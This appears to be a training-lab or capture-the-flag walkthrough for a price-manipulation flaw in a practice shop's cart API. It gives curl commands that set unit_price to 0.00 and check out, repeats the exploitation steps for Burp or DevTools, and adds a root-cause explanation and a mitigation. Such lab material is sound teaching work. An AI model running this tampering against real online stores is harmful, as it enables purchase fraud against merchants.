curl --fail-with-body -sS -c /tmp/hl-price.cookie -b /tmp/hl-price.cookie -H 'Content-Type: application/json' --data '{"product_id":"hsm-enterprise-1","quantity":1,"unit_price":"0.00"}' '{{ target_base }}/price-manipulation/api/cart/items'

curl --fail-with-body -sS -b /tmp/hl-price.cookie -X POST '{{ target_base }}/price-manipulation/api/checkout'

    
Eliminar una línea del carrito

    
LINE_ID=$(curl --fail-with-body -sS -b /tmp/hl-price.cookie '{{ target_base }}/price-manipulation/api/cart/items' | jq -r '.items[0].line_id')
curl --fail-with-body -sS -c /tmp/hl-price.cookie -b /tmp/hl-price.cookie -X DELETE "{{ target_base }}/price-manipulation/api/cart/items/${LINE_ID}"

    
Causa raíz
El backend persiste el precio enviado por el cliente. El checkout recalcula desde un carrito del servidor, pero ese carrito ya contiene datos manipulados; «server-side» no equivale a «confiable».

    
Mitigación
# Aceptar solo product_id y quantity
unit_price = catalog.get(product_id).price
# Reconsultar precio, stock, impuestos y descuentos en checkout

  

  

    
Exploitation

    
    
      
  1. Open DevTools or intercept POST /price-manipulation/api/cart/items with Burp.
    2. 
      
  2. The request body contains product_id, quantity, and unit_price. Change only unit_price to 0.00.
    3. 
      
  3. If you add the wrong line, use Remove next to that item. The API can also delete it by its line_id.
    4. 
      
  4. The server cart now totals $0.00. Check out without adding the product again.
    5. 
      
  5. The order JSON response includes HL{···}.
    6.
